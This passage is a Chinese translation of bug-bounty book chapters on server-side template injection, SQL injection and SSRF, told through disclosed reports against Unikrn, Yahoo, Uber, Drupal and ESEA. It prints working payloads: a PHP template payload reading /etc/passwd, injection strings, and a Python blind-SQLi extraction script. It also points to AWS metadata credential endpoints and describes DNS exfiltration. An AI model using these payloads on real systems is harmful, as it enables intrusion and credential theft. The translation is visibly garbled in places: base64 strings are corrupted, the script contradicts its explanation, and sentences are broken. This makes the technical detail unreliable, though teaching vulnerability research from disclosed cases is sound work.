我怀疑 Unikrn 是否限制了名字的长度。这次我搜索了 PHP 文档中的 `file_get_contents`，它详细说明了如何限制一次读取的数据量。我将负载改为如下内容：

```php
<?php>$s=file_get_contents('/etc/passwd',NULL,0,100);var_dump($s);/<?php
```

该负载中的关键参数是 `'/etc/passwd'`、`0` 和 `100`。路径指向要读取的文件，`0` 指示 PHP 从文件的开始处（在本例中是文件开头），`100` 表示要读取的数据长度。我使用此负载再次向 Unikrn 注册，生成了如图 8-4 所示的邮件。

**图 8-4。**

```
string(100)root:x:0:0:root:/root/zshdaemon:x:1:daemon:/usr/sbin:/usr/sbin/nologin:x:2:/bin/bash has invited you to join Unikrn.
```

![](img/0e0c482eb94dba4b95528b396562dd10_176_0.png)

**图 8-4：显示 /etc/passwd 文件内容的 Unikrn 邀请邮件**

我成功执行了任意代码，并作为概念证明，每次提取 100 个字符的 `/etc/passwd` 文件。在我提交报告后，该漏洞在一个小时内被修复了。

## 启示

处理这个漏洞非常有趣。初始的堆栈跟踪是一个某些出不对的信号，正如俗话说，“无烟不无火”。如果你发现了一个潜在的 SSTI，务必阅读文档以确定最佳进展方式——并坚持。

## 总结

当你寻找漏洞时，最好的尝试是确认底层技术（无论是 Web 框架、前端渲染引擎还是其他）。如果任何 Rails 网站将用户控制的输入传递给 `render` 函数，它就存在漏洞。理解 Rails 使用的设计模式无疑有助于发现这一漏洞。就像此示例中的模板参数一样，要留意当你控制可能与内容渲染方式直接相关的输入时，可能出现的机会。了解所使用的技术将帮助你克服挑战，例如在邮件中。

# 9 SQL 注入

![](img/0e0c482eb94dba4b95528b396562dd10_178_0.png)

当数据库网站漏洞允许攻击者使用 SQL（结构查询语言）查询或攻击数据库时，这被称为 SQL 注入（SQLi）。SQL 注入通常非常有回报，因为攻击者可以操纵或提取信息，甚至为自己创建一个管理员登录。

## SQL 数据库

数据库将表中的字段存储信息。表包含一个或多个列，表中的行代表数据库中的记录。

用户依赖 SQL 来创建、读取、更新和删除数据库中的记录。用户向数据库发送 SQL 命令（语句或查询），如果命令接受，数据库将解释语句并执行某些操作。流行的 SQL 数据库包括 `MySQL`、`PostgreSQL`、`MSSQL` 等。在本章中，我们将使用 `MySQL`，但通用概念适用于所有 SQL 数据库。

URL 参数。查询通过将 `$query` 变量传递给 PHP 函数 `mysql_query()` 执行。

网站期望 `name` 包含普通文本。但如果用户在 URL 参数中输入恶意输入 `'test' OR 1=1`，例如 `https://www.example.com?name='test' OR 1='1'`，执行的查询如下：

```
$query = "SELECT * FROM users WHERE name = 'test' OR 1='1'";
```

恶意输入闭合了值 `test` 之后的起始单引号（`'`），并在查询末尾添加了 SQL 代码 `OR 1=1`。`OR ='1'` 中悬挂的单引号开启了硬编码在其在其后的闭合单引号。如果注入的查询不包含起始单引号，那么悬挂的单引号将导致 SQL 语法错误，从而阻止查询执行。

SQL 使用条件运算符 `AND` 和 `OR`。在这种情况下，SQLi 修改了 `WHERE` 子句，以搜索 `name` 列匹配 `test` 或等式 `1='1'` 为真的记录。`MySQL` 帮助将 `'1'` 视为整数，因为 1 始终等于 1，所以条件为真，查询返回了 `users` 表中的所有记录。但当查询的其他部分经过过滤处理时，注入 `'test' OR 1='1` 将不起作用。例如，你可能使用了 `$_GET['name']`：

```
$name = $_GET['name'];
$password = mysql_real_escape_string($_GET['password']);
$query = "SELECT * FROM users WHERE name = '$name' AND password = '$password'";
```

在这种情况下，`password` 参数也是由用户控制的，但经过了正确的过滤。如果你在 `name` 中使用了相同的负载 `test' OR 1='1`，且你的密码是 `12345`，你的语句看起来如下：

```
$query = "SELECT * FROM users WHERE name = 'test' OR 1='1' AND password = '12345";
```

该查询查找 `name` 为 `test` 或 `1='1'` 且 `password` 为 `12345` 的所有记录（我们将忽略数据库存储明文密码的事实，这是另一个漏洞）。由于密码检查使用了 `AND` 运算符，除非记录的密码为 `12345`，否则该查询不会返回该数据。尽管这破坏了我们尝试的 SQLi，但并没有阻止我们尝试另一种方法。

我们需要消除 `password` 参数，可以通过添加 `; test' OR 1='1';--` 来实现。此注入完成了两个任务：分号（`;`）结束了 SQL 语句，两个连字符（`--`）告诉数据库剩余文本是注释。此注入参数将查询更改为 `SELECT * FROM users WHERE name = 'test' OR 1='1'`。语句中的 `AND password = '12345'` 代码变成了注释，因为命令返回了表中的所有记录。当你使用 `--` 作为注释时，请记住 `MySQL` 要求在连字符和剩余查询之间保留一个空格。否则，`MySQL` 将返回错误而不执行命令。

## 防止 SQLi 的防御措施

防止 SQLi 的一种可用保护措施是使用预编译语句（prepared statements），这是一种执行重复查询的数据库功能。预编译语句的具体细节超出了本书的范围，但它们可以防止 SQLi，因为查询不再是动态执行的。数据库通过为变量设置占位符将查询像模板一样使用。结果是，使用户向查询传递未过滤的数据，注入也无法修改数据库的查询模板，从而防止 SQLi。

Web 框架（如 `Ruby on Rails`、`Django`、`Symfony` 等）也提供了内置保护措施来帮助防止 SQLi。但它们并非完美，无法在任何地方防止此类漏洞。你刚刚看到的两个简单的 SQLi 示例通常在使用框架构建的网站上无效，除非网站开发者没有遵循最佳实践，或者没有意识到保护会自动提供。例如，网站 `https://rails-sqli.org/` 维护了一份 Rails 中常见的 SQLi 模式列表，这些模式是由开发者错误导致的。在测试 SQLi 漏洞时，你最好的选择是寻找看起来是自定义构建的老旧网站，或者使用不具备当前系统所有内置保护功能的 Web 框架和内容管理系统。

# 雅虎体育盲注 SQLi

**难度：** 中等

**URL：** `https://sports.yahoo.com`

**来源：** N/A

**报告日期：** 2014年2月16日

**已付赏金：** $3,705

当你可以将 SQL 语句注入查询中但无法获得查询的直接输出时，就会发生盲注 SQLi 漏洞。利用盲注的关键是通过比较未修改和修改后的查询结果来推断信息。例如，2014年2月，Stefano Vettorazzi 在测试雅虎体育子域名时发现了一个盲注 SQLi。该页面通过 URL 接收参数，查询数据库信息，并根据参数返回 NFL 球员列表。

Vettorazzi 更改了以下返回 2010 年 NFL 球员的 URL，从：

`sports.yahoo.com/nfl/draft?year=2010&type=20&round=2`

更改为：

`sports.yahoo.com/nfl/draft?year=2010-&type=20&round=2`



Vettorazzi 在第二个 URL 的 `year` 参数中添加了两个连字符（`--`）。图 9-1 显示了 Vettorazzi 添加两个连字符之前雅虎页面的样子。图 9-2 显示了 Vettorazzi 添加连字符后的结果。

图 9-1 返回的球员与图 9-2 返回的球员不同。我们无法看到实际的查询，因为代码在网站的后端。但原始查询可能会将每个 URL 参数传递给类似下面的 SQL 查询：

```
SELECT * FROM players WHERE year = 2010 AND type = 20 round = 2;
```

通过在 `year` 参数中添加两个连字符，Vettorazzi 将查询更改为：

```
SELECT * FROM PLAYERS WHERE year = 2010-- AND type = 20 AND round = 2;
```

## NFL 选秀 - 雅虎体育（隐私浏览）

sports.yahoo.com/nfl/draft?year=2010&type=20&round=2

| 顺位 | 球队 | 位置 | 高度 | 重量 | 学校 |
|---|---|---|---|---|---|
| | Sam Bradford | QB | 64 | 218 | Oklahoma |
| 第一轮 (7) | Namukong Suh | DT | 64 | 300 | Nebraska |
| | | | | | |
| 第二轮 (33) | Gerald McCoy | DT | 64 | 295 | Oklahoma |

> National Football Post：对于洛杉矶队来说，这是一个不容疑问的选择，因为他们可以挑选自己的球队四卫。Sam Bradford 展现了准确性与身体素质迷人的结合，他显然是选秀会中的头号指挥员。
>
> National Football Post：底特队在攻守两端都有，但 Suh 在更高水平可能是一个真正的改变者。一名顶级的防守锋线，可以制服地面进攻并知道如何接近传球。

这个雅虎漏洞有点奇怪，因为在大多数甚至所有数据库中，查询必须以分号结束。由于 Vettorazzi 只注入了两个连字符并注释掉了查询的分号，该查询应该失败并返回一个错误或无记录。某些数据库可以接受不带分号的查询，因此 Yahoo! 要么使用了此功能，要么其代码以其他方式处理了错误。无论如何，在 Vettorazzi 注意到查询返回的不同结果后，他尝试通过提交以下代码作为参数来推断该网站使用的数据库版本：

```
(2010)and(if(mid(version(),1,1))=5,true,false))--
```

MySQL 数据库 `version()` 函数返回当前使用的 MySQL 数据库版本。`mid` 函数根据其第二个和第三个参数返回传递给第一个参数的字符串的一部分。第二个参数指定函数返回的子字符串的起始位置，第三个参数指定子字符串的长度。Vettorazzi 通过调用 `version()` 检查了网站是否使用了 MySQL。然后，他尝试通过将 `1` 作为 `mid` 函数起始位置的第一个参数，并将 `1` 作为子字符串长度的第二个参数获取版本号中的第一个数字。该代码使用 `if` 语句检查 MySQL 版本的第一个数字。

`if` 语句接受三个参数：一个逻辑检查、检查为真时执行的操作，以及检查为假时执行的操作。在这种情况下，代码检查来自 `version` 的第一个数字是否为 `5`；如果是，查询返回 `true`。如果不是，查询返回 `false`。

然后，Vettorazzi 使用 `and` 运算符将 `true/false` 输出与年份参数连接起来，如果 MySQL 数据库的主版本为 `5`，则 Yahoo! 网页上将返回 2010 年的球员。该查询之所以这样工作，是因为条件 `2010 and true` 为 `true`，而 `2010 and false` 则为 `false` 且不返回任何记录。Vettorazzi 执行查询后没有收到任何记录，如图 9-3 所示，这意味着 `version` 返回的值的第一个数字不是 `5`。

![](img/0e0c482eb94dba4b95528b396562dd10_188_0.png)

图 9-3：当代码检查数据库版本是否以数字 5 开头时，Yahoo! 的搜索结果为空。

这是一个盲目 SQL 注入（blind SQLi），因为 Vettorazzi 无法注入他的查询并直接在页面上看到输出。但 Vettorazzi 仍然可以找到有关网站的信息。通过插入布尔检查（例如检查版本的 `if` 语句），Vettorazzi 可以推断出所需的信息。

他本可以继续从 Yahoo! 数据库中提取信息。但通过测试查询找到 MySQL 版本信息已足以向 Yahoo! 确认漏洞的存在。

## 核心点总结

SQLi 漏洞和其他注入漏洞一样并不总是难以利用。发现 SQLi 漏洞的一种方法是测试 URL 参数并寻找查询结果的细微变化。在这种情况下，添加双连字符改变了 Vettorazzi 基准查询的结果，从而揭示了 SQLi。

## UBER 盲目 SQL 注入

**难度**: 中等

**URL:** https://sctrack.email.uber.com.cn/track/unsubscribe.do/

**来源**: https://hackerone.com/reports/150156/

**报告日期**: 2016年7月8日

**支付的赏金**: $4,000

除了网页之外，你可以在其他地方发现盲目 SQL 注入漏洞，例如电子邮件链接。2016年7月，Orange Tsai 收到一封来自 Uber 的邮件广告。他注意到退订链接包含一个 base64 编码的字符串作为 URL 参数。链接看起来如下：

```
http://sctrack.email.uber.com.cn/track/unsubscribe.do?
p=eyJ1c2VyX2lkkljlogjU3NTUILCAicmVjZW2ZXItOiAib3
```

## JhbmdlQG15bWFpbCJ9

使用 base64 解码 `p` 参数值 `eyJ1c2VyX2kljojljU3NTUILCAcmVjWIZXOiabJhbmdlQG15bWFpbCJ9` 返回 JSON 字符串 `"user_id": "5755", "receiver": "orange@mysql"`。对于解码后的字符串，Orange 在编码的 `p` 参数增加了代码 `sleep(12) = 1`。这个无害的添加使得数据库需要更长时间来响应退订操作 `"user_id": "5755 and sleep(12)=1", "receiver": "orange@mysql"`。如果网站存在漏洞，它将在12秒内不执行任何操作，然后将 `sleep` 命令的输出与 1 进行比较。在 MySQL 中，`sleep` 命令通常返回 0，因此这种比较将失败。但这并不重要，因为执行至少需要 12 秒。

在 Orange 重新编码修改后的负载并将其传递给 URL 参数后，他访问了退订链接以确认 HTTP 响应至少花费了12 秒。意识到他需要更具体的 SQLi 证明发送给 Uber，他通过暴力破解提取了用户名、主机名和数据库名。通过这样做，他证明了可以在不访问机密数据的情况下从 SQLi 漏洞中提取信息。

名为 `user()` 的 SQL 函数以 `<user>@<host>` 的形式返回数据库的用户名和主机名。由于 Orange 无法访问注入查询的输出，他无法调用 `user()`。相反，Orange 修改了他的查询，在查找用户 ID 时添加条件检查，使用 `mid` 函数每次比较数据库用户名和主机名字符串的一个字符。类似于 Yahoo! 体育盲目 SQL 注入，Orange 使用 `mid` 函数检查 `user` 返回值的第一个字符。例如，Orange 使用 `if` 语句检查该字符是否等于某个字符。如果比较语句为真，服务器将执行退订命令。如果为假，服务器将不会尝试退订。通过这种方法检查 `user` 函数的返回值，Orange 最终可以导出整个字符串。手动暴力破解字符串非常耗时，因此 Orange 创建了一个 Python 脚本来代表他生成并提交负载，如下：

```python
import json
import string
import requests
from urllib import quote
from base64 import b64encode
base = string.digits + string.letters + '-.'
payload = {'user_id': 5755, 'receiver': 'orange@mysql'}
for l in range(30):
    for i in base:
        payload['user_id'] = '5755 and mid(user,%d,%c)'%(l+1, i)
        new_payload = json.dumps(payload)
        new_payload = b64encode(new_payload)
        r = requests.get('http://sctrack.email.uber.com.cn/track/unsubscribe.do?p='+quote(new_payload))
        if len(r.content)>0:
            print i
            break
```

Python 脚本以五行 `import` 语句开始，获取了 Orange 所需的库以处理 HTTP 请求、JSON 和字符串编码。

在 MySQL 中进行注释，并将 Orange 注入之后查询的任何部分转换为注释。

变量 `i` 和 `j` 是 4 处和 5 处的循环迭代器。当代码第一次进入 4 处的 `range(0,30)` 中的 `i` 时，`i` 将为 0。`i` 的值是脚本尝试暴力破解的 `user` 函数返回的用户名和主机名字符串中的位置。一旦脚本确定了正在测试的用户名和主机名字符串中的位置，代码就会进入 5 处的嵌套循环，遍历基础字符串中的每个字符。当脚本第一次遍历这两个循环时，`i` 将为 0 且 `j` 将为 a。这些值被传递给 6 处的 `mid` 函数，用以创建负载 `"5755 and mid(user,0,1)='a#"`。

在嵌套 `for` 循环的下一次迭代中，`i` 的值仍将为 0，且 `j` 将变为 b，从而创建负载 `"5755 and mid(user,0,1)='b#"`。当循环遍历基础字符串中的每个字符以创建 6 处的负载时，位置 `i` 将保持不变。

每当创建一个新负载时，7 之后的代码就会将负载转换为 JSON，使用 `base64encode` 函数对字符串进行重新编码，并将 HTTP 请求发送到服务器。8 处的代码检查服务器是否响应了消息。如果 `j` 中的字符与测试位置的用户名子字符串匹配，脚本将停止在该位置的字符测试，并移动到用户字符串中的下一个位置。嵌套循环中断并返回 4 处的循环，该循环将 `i` 加 1，以测试用户名字符串的下一个位置。

这一概念证明让 Orange 确认了数据库用户名和主机名为 `sendcloud_w@10.9.79.210`，数据库名为 `sendcloud`（若要获取数据库名，将 6 处的 `user` 替换为 `database`）。针对该报告，Uber 确认其服务器上并未发生 SQL 注入。注入发生在 Uber 使用的一个第三方服务器上，但 Uber 仍然支付了奖金。没有任何漏洞赏金计划会这样做。Uber 可能会支付奖金是因为该漏洞允许攻击者从 `sendcloud` 数据库中导出 Uber 的所有客户电子邮件地址。

尽管你可以像 Orange 那样编写自己的脚本来从漏洞网站提取数据库信息，你也可以使用自动化工具。附录 A 包含了关于名为 `sqlmap` 的此类工具的信息。

## 核心总结

- 留意接受编码参数的 HTTP 请求。在解码并将你的查询注入请求中后，务必重新编码你的负载，以确保所有内容仍然符合服务器预期的编码。
- 提取数据库名、用户名和主机名通常是无害的，但请确保这处于你参与的漏洞赏金计划允许的操作范围内。在某些情况下，`sleep` 命令就足够用于概念证明。

## DRUPAL SQLi

难度：困难 (Hard)

URL：任何使用 7.32 或更早版本的 Drupal 站点

来源：https://hackerone.com/reports/31756/

报告日期：2014年10月17日

支付赏金：$3,000

Drupal 是一个流行的构建网站的开源内容管理系统，类似于 Joomla! 和 WordPress。它用 PHP 编写并是模块化的，这意味着你可以以单元为的形式向 Drupal 站点安装新功能。每个 Drupal 安装程序都包含 Drupal 核心（core），这是一组运行该平台的模块。这些核心模块需要连接到数据库，例如 MySQL。

2014 年，Drupal 对其核心发布了紧急安全更新，因为所有 Drupal 站点都受到一种 SQLi 漏洞的影响，该漏洞可以被匿名用户轻易利用。未修复的 Drupal 站点的影响将允许攻击者接管任何 Drupal 站点。Stefan Horst 在注意到 Drupal 核心预语句（prepared statement）功能中的一个错误时发现了该漏洞。

Drupal 漏洞发生在 Drupal 的数据库编程接口（API）中。Drupal API 使用 PHP Data Objects (PDO) 扩展，这是 PHP 中访问数据库的接口。接口是一种编程概念，它保证函数的输入和输出，而不定义函数的实现方式。换句话说，PDO 隐藏了不同数据库之间的差异，使得程序员无论数据库类型如何，都可以使用相同的函数来查询和获取数据。PDO 支持预语句。

Drupal 创建了一个数据库 API 来使用 PDO 功能。该 API 创建了 Drupal 数据库抽象层，使得开发者无需使用自己的代码直接查询数据库。但他们仍然可以使用预语句并将他们的代码应用于任何数据库类型。API 的具体细节超出了本书的范围。但你需要知道该 API 会生成查询数据库的 SQL 语句，并内置了安全检查以防止漏洞。

回想一下，预语句可以防止 SQLi 漏洞，因为即使输入未经过过滤，攻击者无法通过恶意输入修改查询结构。但当注入发生在模板创建期间时，预语句无法防止 SQLi 漏洞。如果攻击者可以在模板创建过程中注入恶意输入，他们就可以创建自己的恶意预语句。Horst 发现的漏洞源于 SQL 的 `IN` 子句，该子句用于查找在值列表中存在的值。例如，代码 `SELECT * FROM users WHERE name IN ('peter', 'paul', 'ringo');` 会从 `users` 表中选择 `name` 列值为 peter, `paul`, `ringo` 的数据。

为了理解为什么 `IN` 子句是有漏洞的，让我们看看 Drupal API 背后的代码：

```
$this->expandArguments($query, $args);
$stmt = $this->prepare($query);
$stmt->execute($args);
```

`expandArguments` 函数负责构建使用 `IN` 子句的查询。在 `expandArguments` 构建查询后，它们被传递给 `prepareQuery` 并执行。为了理解这一过程的意义，让我们查看 `expandArguments` 的相关代码：

```
foreach (array_filter($args, 'array') as $key => $data) {
  $new_keys = array();
  foreach ($data as $i => $value) {
    $new_keys[$key . '_' . $i] = $value;
  }
}
```

这段 PHP 代码使用了数组，显式定义的键如下：

| 'red' | 'apple' |
| :--- | :--- |
| 'yellow' | 'banana' |

或者，PHP 可以使用结构数组，如下：

| ['apple', 'banana'] |

结构数组的键是隐式的，基于值的位置。例如，'apple' 的键是 0，'banana' 的键是 1。

`foreach` PHP 函数遍历数组并可以分离的键和值。它还可以为每个每个值。生成的查询使用 `name_0` 和 `name_1` 代替键，如下所示：

```
SELECT * FROM users WHERE IN (:name_0,:name_1)
```

但当你使用关联数组调用 `db_query` 时，问题就会出现，如下代码所示：

```
db_query("SELECT * FROM {users} where name IN (:name)",narray(:name=>array('test' =>'user1', 'test' =>'user2')));
```

在这种情况下，`:name` 是一个数组，其键为 `--` 和 `'test'`。当 `expandArguments` 接收 `:name` 数组并对其处理以创建查询时，它生成了如下：

```
SELECT * FROM users WHERE IN (:name_test);--, :name_test
```

我们在预处理语句中注入了注释。发生这种情况的原因是 `expandArguments` 遍历每个数组元素来构建占位符，但它假设传递的是一个结构化数组。在第一次迭代中，`$i` 被赋值为 `'test);--`，`$value` 被赋值为 `'user1'`。`$key` 是 `:name`，将该 `$value` 与 `$i` 组合得到 `name_test);--`。在第二次迭代中，`$i` 被赋值为 `'test'`，`$value` 被赋值为 `'user2'`。将 `$key` 与 `$i` 组合得到值 `name_test`。



这种行为允许恶意用户将 SQL 语句注入到依赖 `IN` 子句的 Drupal 查询中。该漏洞影响 Drupal 的登录功能，使得 SQL 漏洞非常严重，因为任何网站用户（包括匿名用户）都可以利用它。糟糕的是，PHP PDO 默认支持同时执行多个查询。这意味着攻击者可以向用户登录查询中附加额外的查询，以执行非 `IN` 的 SQL 命令。例如，攻击者可以使用 `INSERT` 语句（向数据库插入记录）来创建一个管理员用户，然后他们可以使用该用户登录网站。

## 启示

这个 SQLi 漏洞并非仅仅是提交一个单引号并破坏查询的问题。相反，它需要理解 Drupal 核心数据库 API 如何处理 `IN` 子句。从此漏洞中获得的教训是，要留意更改传递给网站输入结构的机会。当 URL 将 `name` 作为参数时，尝试向参数添加 `[]` 将其更改为数组并测试网站如何处理它。

## 总结

SQLi 可能是一个严重的漏洞，并对网站是危险的。如果攻击者发现了 SQLi，他们可能会获得网站的完全权限。在某些情况下，可以通过向数据库中插入数据来扩大 SQLi 漏洞，从而在网站上获得管理员权限，正如 Drupal 示例所示。当你寻找 SQLi 漏洞时，请探索可以向查询传递未转义的单引号或双引号的地方。当你发现一个漏洞时，该漏洞存在的迹象可能是细微的，例如盲注。你还应该寻找可以以意想不到的方式向网站传递数据的地方，例如在请求数据中可以替换数组参数的地方，正如 Uber 漏洞中的所示。

# 10 跨站服务器端请求伪造 (SSRF)

![](img/0e0c482eb94dba4b95528b396562dd10_202_0.png)

服务器端请求伪造（SSRF）漏洞允许攻击者让服务器执行非预期的网络请求。与跨站请求伪造（CSRF）漏洞类似，SSRF 滥用另一个系统来执行恶意操作。虽然 CSRF 利用的是另一个用户，但 SSRF 利用的是目标应用程序服务器。与 CSRF 一样，SSRF 漏洞的影响和执行方法可能有所不同。然而，仅仅因为你可以让目标服务器向其他服务器发送请求，并不意味着目标应用程序存在漏洞。应用程序可能会故意允许这种行为。因此，当你发现潜在的 SSRF 时，了解如何演示其影响是关键的。

## 演示服务器端请求伪造的影响

取决于网站的组织方式，易受 SSRF 攻击的服务器可能会向内部网络或外部地址发送 HTTP 请求。服务器发送请求的能力决定了你可以利用 SSRF 做什么。

一些大型网站拥有防火墙，禁止外部互联网流量访问内部服务器：例如，网站将有有限的面向公众的服务器接收访问者的 HTTP 请求，并向公网无法访问的服务器发送请求。一个常见的例子是数据库服务器，它通常无法从互联网访问。当你登录到一个与数据库服务器通信的网站时，你可能会通过普通的 Web 表单提交用户名和密码。网站将接收你的 HTTP 请求并使用你的凭据向数据库服务器发送自己的请求。然后数据库服务器将向 Web 应用程序服务器响应，Web 应用程序服务器会将信息转发给给你。在此过程中，你通常不知道远程数据库服务器的存在，而且你不应该直接访问数据库。

允许攻击者控制发往内部服务器请求的易漏洞服务器可能会泄露隐私信息。例如，如果之前的数据库示例中存在 SSRF，它可能允许攻击者向数据库服务器发送请求并检索他们不应访问的信息。SSRF 漏洞为攻击者提供了更广泛的待攻击网络。

假设你发现了一个 SSRF，但易漏洞的网站没有内部服务器，或者这些服务器无法通过该漏洞访问。在这种情况下，检查你是否可以从易漏洞服务器向任意外部站点执行请求。如果你可以利用目标服务器与你控制的服务器进行通信，你可以使用其请求的信息来了解更多目标目标。如果易漏洞服务器遵循重定向，你可能还可以控制对目标站的响应，这是 Justin Kennedy 指出的一个技巧。在某些情况下，网站不会允许访问内部 IP，但会连接外部网站。如果是这样，你可以返回状态码为 301、302、303 或 307 的 HTTP 响应，这些都是重定向类型。由于你控制了响应，你可以将重定向指向内部 IP 地址，以测试服务器是否会遵循重定向并向其内部网络发送 HTTP 请求。

或者，你可以利用服务器的响应来测试其他漏洞，例如 SQLi 或 XSS，正如第 98 页“使用 SSRF 响应攻击用户”所讨论的。这取决于目标应用程序的使用，但在这些情况下，发挥创意通常是有回报的。影响最小的情况是 SSRF 漏洞仅允许你与有限的外部网站通信。在这些情况下，你可能会利用配置错误的黑名单。

在确认可以提交 SSRF 后，确认你是否可以调用 GET 或 POST 方法来利用网站。如果攻击者可以控制 POST 参数，则 HTTP POST 请求可能更为严重；POST 请求通常涉及状态更改，例如创建用户账户、调用系统命令或执行任意代码，取决于易漏洞服务器可以与其他应用程序通信。相比之下，HTTP GET 请求通常与数据泄露有关。由于 POST 请求 SSRF 复杂且取决于系统，在本章中我们将关注使用 GET 请求的漏洞。要了解更多基于 POST 请求的 SSRF，请阅读 Tsai 在 Black Hat 2017 的演示灯片：https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf。

## 执行盲 SSRF

在确认了在哪里以及如何发送请求后，考虑你是否可以访问请求的响应。当你无法访问响应时，你就发现了一个盲 SSRF。例如，攻击者可能拥有内部

可以通过 SSRF 访问网络，但无法读取指向内部服务器请求的 HTTP 响应。因此，他们需要找到其他方法来提取信息，通常是使用计时攻击或域名系统（DNS）。

在某些盲目 SSRF 中，响应时间可以揭示交互服务器的信息。利用响应时间的一种方法是扫描无法访问的服务器端口。端口在服务器之间传输信息。你通过发送请求并观察端口是否有响应来扫描服务器上的端口。例如，你可以尝试通过扫描内部服务器来利用内部网络的 SSRF。通过这种方式，你可以根据已知端口（如 80 或 443 端口）的响应是在 1 秒内还是 10 秒内返回，判断服务器是开放、关闭还是被过滤。被过滤的端口就像通信黑洞。它们不会响应请求，因此你永远不知道它们是开放还是关闭的，且请求将超时。相反，快速的响应可能意味着服务器已开放并接受通信，或者已关闭且不接受通信。当你利用 SSRF 进行端口扫描时，尝试连接到常用端口，例如 22（SSH 开放）、80（HTTP）、443（HTTPS）、8080（备用 HTTP）和 8443（备用 HTTPS）。你将确认响应是否存在差异，并根据这些差异推断出信息。

DNS 是互联网的地图。你可以尝试使用内部系统调用 DNS 请求并控制请求的地址，包括子域名。如果你成功了，可能从盲目 SSRF 漏洞中带出信息。要以这种方式利用盲目 SSRF，你将带出的信息作为子域名附加到自己的域名上。目标服务器会对你网站的该子域名执行 DNS 查询。例如，假设你发现了一个盲目 SSRF 并在服务器上执行了有限命令但无法读取任何响应。如果你在控制查询域名时调用 DNS 查询，可以将 SSRF 的输出添加到子域名并使用 `whoami` 命令。这种技术通常被称为带外（OOB）外泄。当你在子域名上使用 `whoami` 命令时，漏洞网站会向你的服务器发送 DNS 请求。你的服务器接收到对 `data.<yourdomain>.com` 的 DNS 查询，其中 `data` 是漏洞服务器 `whoami` 命令的输出。由于 URL 只能包含字母数字，你需要使用 base32 编码对数据进行编码。

## 使用 SSRF 响应攻击用户

当你无法针对内部系统时，可以尝试利用影响用户或应用程序本身的 SSRF。如果你的 SSRF 不是盲目的，那么一种利用它的方法是向 SSRF 请求返回恶意响应，例如跨站脚本（XSS）或 SQL 注入（SQLi）有效负载，这些负载会在漏洞网站上执行。如果其他用户经常访问这些负载，存储型 XSS 负载尤为重要，因为你可以利用这些负载来攻击用户。例如，假设 `www.<example>.com/picture?url=` 接受一个 URL 参数，用于为你的个人资料获取图像。你可以提交一个指向你自己网站的 URL，该 URL 返回一个带有 XSS 负载的 HTML 页面。因此，完整的 URL 将是 `www.<example>.com/picture?url=<attacker>.xss`。如果 `www.<example>.com` 保存了该负载的 HTML 并将其渲染为个人图像，则该网站将存在存储型 XSS 漏洞。但如果网站渲染了 HTML 负载而没有保存，你仍然可以测试该操作的防止 CSRF 是否生效。如果没有生效，你可以将 URL `www.<example>.com/picture?url=<attacker>.xss` 分享给目标。目标访问链接后，XSS 将由于 SSRF 的结果而触发，并向你的网站发送请求。

在寻找 SSRF 漏洞时，请留意是否有作为某些功能的一部分提交 URL 或 IP 地址的机会。然后考虑你如何利用该行为与内部系统通信，或将其与其他某种类型的恶意行为相结合。

## ESEA SSRF 与查询 AWS 元数据

**难度：** 中等

**URL：** https://play.esea.net/global/media_preview.php?url=/

**来源：** http://bier.haus/2016/04/18/esea-server-side-request-forgery-and-querying-aws-meta-data/

**报告日期：** 2016 年 4 月 11 日

**奖金金额：** $1,000

在某些情况下，你可以通过多种方式利用并演示 SSRF 的影响。电子竞技娱乐协会（ESEA）是一个竞争性视频游戏社区，它在 2016 年启动了自运行的漏洞赏金计划。在 ESEA 启动该计划后，Brett Buerhaus 使用 Google 轰炸（Google dorking）快速搜索以 .php 文件扩展名结尾的 URL。Google 轰炸使用 Google 搜索关键词来指定搜索位置和要查找的信息类型。Buerhaus 使用查询 `site:https://play.esea.net/ext:php`，这告诉 Google 仅当文件以 .php 结尾时才返回来自 https://play.esea.net/ 网站的结果。旧版网站提供以 .php 结尾的网页，可能表明该页面正在使用过时的功能，这是寻找漏洞的好地方。当 Buerhaus 在结果中收到的 URL `https://play.esea.net/global/media_preview.php?url=` 时。

该结果之所以引人注目，是因为该参数。该参数表明 ESEA 可能正在渲染内容。当你寻找 SSRF 时，Buerhaus 将自己的域名插入参数中。因此，不是请求 `https://play.esea.net/global/media_preview.php?url=ziot.org`，而是 Buerhaus 该网站会请求 `url=ziot.org`。这个测试也失败了。

验证文件扩展是一种常见方法。在需要手动管理字符串的编程语言中，空字节会终止字符串。取决于网站实现功能，添加空字节可能会提前导致 URL 结束。如果 ESEA 存在漏洞，与其不是请求 `https://play.esea.net/global/media_preview.php?url=ziot.org/00`，网站将进行请求。但 Buerhaus 发现添加空字节无效。接下来，他尝试添加多个斜杠，这会分割 URL 部分。因为多个斜杠是不符合标准的。与其不是请求 `https://play.esea.net/global/media_preview.php?url=ziot.org///1.png`，Buerhaus 希望该网站会请求 `https://play.esea.net/global/media_preview.php?url=ziot.org`。

在最后一次尝试中，Buerhaus 将 URL 中的 1.png 从 URL 的一部分改为参数，将正斜杠转换为问号。因此，不是请求 `https://play.esea.net/global/media_preview.php?url=ziot.org/1.png`，而是提交 `https://play.esea.net/global/media_preview.php?url=ziot.org?1.png`。第一个 URL 是向他的网站提交 /1.png 的请求。但第二个 URL 导致请求发送到主页 http://ziot.org。

Buerhaus 已经确认他可以发出外部请求且网站会渲染响应——这是一个良好的开始。调用任何服务器对公司来说可能是可以接受的风险，只要服务器不披露信息或不对 HTTP 响应进行任何操作。为了提高 SSRF 的严重性，Buerhaus 在他的服务器响应中返回了 XSS 有效负载，如第 98 页“使用 SSRF 响应攻击用户”所示。

他将漏洞分享给 Ben Sadeghipour 看看是否可以升级。Sadeghipour 建议提交 `http://169.254.169.254/latest/meta-data/hostname`。这是亚马逊服务（AWS）为其主机提供的 IP 地址。如果 AWS 服务器向此 URL 的 HTTP 请求，AWS 将返回有关服务器的元数据。通常，此功能有助于内部自动化和脚本。该端点也可访问私人信息。取决于网站的 AWS 配置，端点 `http://169.254.169.254/latest/meta-data/iam/security-credentials/` 返回执行请求的服务器的身份访问管理（IAM）安全凭证。由于 AWS 安全凭证难以配置，账户拥有超出所需权限的情况并不罕见。如果你可以访问这些凭证，

AWS 命令行可以控制用户有访问权限的任何服务。ESEA 实际上托管在 AWS 上，服务器的内部主机名被返回给了 Buerhaus。此时，他停止了并报告了该漏洞。

## 核心要总结

